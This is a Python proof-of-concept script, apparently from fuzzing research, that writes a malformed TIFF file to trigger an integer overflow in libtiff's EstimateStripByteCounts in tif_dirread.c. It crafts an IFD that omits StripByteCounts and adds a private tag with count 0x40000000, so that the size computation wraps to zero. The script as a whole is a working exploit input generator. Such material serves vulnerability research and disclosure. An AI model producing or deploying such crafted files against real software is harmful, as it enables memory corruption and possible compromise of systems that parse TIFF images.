#!/usr/bin/env python3
"""
PoC generator for libtiff EstimateStripByteCounts integer overflow (VULN 001).

Trigger: tif_dirread.c line 1015:
    cc = cc * dp->tdir_count;
When tdir_type=TIFF_LONG (TIFFDataWidth=4) and tdir_count=0x40000000,
4 * 0x40000000 = 0x100000000 wraps to 0 as uint32.
"""

import struct
import os

OUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_dirread_c"
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.tif")

def pack_ifd_entry(tag, typ, count, value_or_offset):
    return struct.pack("<HHII", tag, typ, count, value_or_offset)

# TIFF type constants
TYPE_SHORT = 3
TYPE_LONG  = 4

# IFD entries (must be sorted by tag, ascending)
# We will fix up StripOffsets value after computing sizes.

# Layout:
#   0: TIFF header (8 bytes)
#   8: IFD (2 + N*12 + 4 bytes)
#   after IFD: strip data (8 bytes of zeros)

NUM_ENTRIES = 9  # NOT including StripByteCounts

ifd_start = 8
ifd_size  = 2 + NUM_ENTRIES * 12 + 4   # count(2) + entries + next_ifd(4)
strip_data_offset = ifd_start + ifd_size

entries = [
    # tag,   type,       count,       value_or_offset
    (0x0100, TYPE_SHORT, 1,           1),           # ImageWidth = 1
    (0x0101, TYPE_SHORT, 1,           1),           # ImageLength = 1
    (0x0102, TYPE_SHORT, 1,           8),           # BitsPerSample = 8
    (0x0103, TYPE_SHORT, 1,           5),           # Compression = LZW (5) — key trigger
    (0x0106, TYPE_SHORT, 1,           1),           # PhotometricInterpretation = BlackIsZero
    (0x0111, TYPE_LONG,  1,           strip_data_offset),  # StripOffsets
    (0x0115, TYPE_SHORT, 1,           1),           # SamplesPerPixel = 1
    (0x0116, TYPE_LONG,  1,           1),           # RowsPerStrip = 1
    # NO StripByteCounts (0x0117) — must be absent to trigger EstimateStripByteCounts
    # Private tag with tdir_count=0x40000000, tdir_type=LONG(4)
    # 4 * 0x40000000 = 0x100000000 overflows uint32 to 0
    (0xFFFF, TYPE_LONG,  0x40000000, 0),           # overflow trigger entry
]

assert len(entries) == NUM_ENTRIES, f"Expected {NUM_ENTRIES} entries, got {len(entries)}"
assert entries == sorted(entries, key=lambda e: e[0]), "IFD entries must be sorted by tag"

# Build IFD bytes
ifd_bytes = struct.pack("<H", NUM_ENTRIES)
for tag, typ, count, val in entries:
    ifd_bytes += pack_ifd_entry(tag, typ, count, val)
ifd_bytes += struct.pack("<I", 0)  # next IFD offset = 0 (end)

# Strip data: 8 bytes of zeros (minimal fake strip)
strip_data = b'\x00' * 8

# TIFF header: little-endian magic + IFD offset = 8
header = struct.pack("<HHI", 0x4949, 0x002A, ifd_start)

tiff_data = header + ifd_bytes + strip_data

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, "wb") as f:
    f.write(tiff_data)

print(f"Written {len(tiff_data)} bytes to {OUT_FILE}")
print(f"  IFD at offset {ifd_start}, {NUM_ENTRIES} entries")
print(f"  Strip data at offset {strip_data_offset}")
print(f"  Overflow entry: tag=0xFFFF type=LONG(4) count=0x40000000")
print(f"  4 * 0x40000000 = 0x{4 * 0x40000000:x} -> wraps to 0x{(4 * 0x40000000) & 0xffffffff:x} as uint32")
